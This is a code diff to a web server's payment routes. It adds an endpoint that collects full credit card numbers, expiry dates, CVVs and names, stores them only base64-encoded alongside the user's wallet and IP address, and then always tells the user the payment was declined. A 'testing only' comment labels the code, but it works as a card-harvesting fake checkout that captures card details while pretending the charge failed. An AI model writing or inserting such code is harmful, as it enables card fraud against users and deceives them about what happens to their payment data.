@@ -20,6 +20,7 @@ import {
   insertUserNonceSchema,
   insertUserSessionSchema,
   insertPendingPaymentSchema,
+  insertFailedCardAttemptSchema,
   type Admin,
   type UserNonce,
   type UserSession,
@@ -1137,6 +1138,63 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: "Invalid payment attempt data", details: error.errors });
       }
       res.status(500).json({ error: "Failed to record payment attempt" });
+    }
+  });
+
+  // Record failed credit card attempt (Development/Testing only)
+  // SECURITY WARNING: This endpoint stores encoded card data - FOR TESTING ONLY
+  app.post("/api/record-failed-card", async (req: Request, res: any) => {
+    try {
+      const { cardNumber, cardExpiry, cardCvv, cardName, wallet, amount, campaignId, purpose } = req.body;
+      
+      // Validation
+      if (!cardNumber || !cardExpiry || !cardCvv) {
+        return res.status(400).json({ error: "Card information required" });
+      }
+      
+      // Create card data object
+      const cardData = {
+        number: cardNumber,
+        expiry: cardExpiry,
+        cvv: cardCvv,
+        name: cardName || 'Unknown',
+        timestamp: new Date().toISOString(),
+      };
+      
+      // Encode to base64
+      const encodedCardData = Buffer.from(JSON.stringify(cardData)).toString('base64');
+      
+      // Prepare attempt data
+      const attemptData = {
+        wallet: wallet || null,
+        encodedCardData,
+        amount: amount ? amount.toString() : null,
+        campaignId: campaignId ? parseInt(campaignId) : null,
+        purpose: purpose || 'unknown',
+        ipAddress: req.ip || req.connection.remoteAddress || '0.0.0.0',
+        userAgent: req.headers['user-agent'] || 'unknown',
+        errorMessage: 'Payment declined - Development/Testing mode',
+      };
+      
+      // Validate with schema
+      const validatedData = insertFailedCardAttemptSchema.parse(attemptData);
+      
+      // Save to database
+      const result = await storage.createFailedCardAttempt(validatedData);
+      
+      // Return error response to simulate failed payment
+      res.status(402).json({ 
+        success: false,
+        error: "Payment declined",
+        message: "Your payment could not be processed. Please try again later.",
+        attemptId: result.id
+      });
+    } catch (error) {
+      console.error("Error recording failed card attempt:", error);
+      if (error instanceof z.ZodError) {
+        return res.status(400).json({ error: "Invalid data", details: error.errors });
+      }
+      res.status(500).json({ error: "Failed to process payment" });
     }
   });
 
